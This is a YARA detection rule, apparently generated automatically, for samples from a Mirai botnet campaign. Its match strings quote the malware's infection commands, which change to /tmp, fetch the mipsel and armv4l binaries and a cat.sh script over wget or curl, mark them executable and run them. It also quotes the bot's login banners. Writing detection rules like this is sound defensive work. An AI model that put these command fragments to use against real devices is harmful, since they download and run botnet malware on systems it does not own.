rule Sightlines_c2_d83770ff_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign c2-d83770ff"
        date = "2026-11-06"
        campaign = "c2-d83770ff"
        family = "mirai"
        hash = "0e60696306f2bd98fe97b2e42d1fa4a515904715338b8c3db2ab39084c20e59d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/c2-d83770ff.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "orf; cd /tmp; /bin/busybox wget http://%s/mipsel; chmod 777 mipsel; ./mipsel realtek; wget http://%s" ascii
        $s1 = " /tmp; wget http://%s/mipsel; chmod 777 mipsel; ./mipsel netis.netcore; wget http://%s/armv4l; chmod" ascii
        $s2 = "cd /tmp || cd /dev wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh; " ascii
        $s3 = "/armv4l; chmod 777 armv4l; ./armv4l realtek; " ascii
        $s4 = " 777 armv4l; ./armv4l netis.netcore; " ascii
        $s5 = "/usr/sbin/NetworkManager" ascii
        $s6 = "Connection: keep-alive" ascii
        $s7 = "[0mNo shell available" ascii
        $s8 = "/usr/sbin/dbus-daemon" ascii
        $s9 = "/bin/busybox ftpget" ascii
        $s10 = "[0mAccess granted!" ascii
        $s11 = "[0mWrong password!" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}
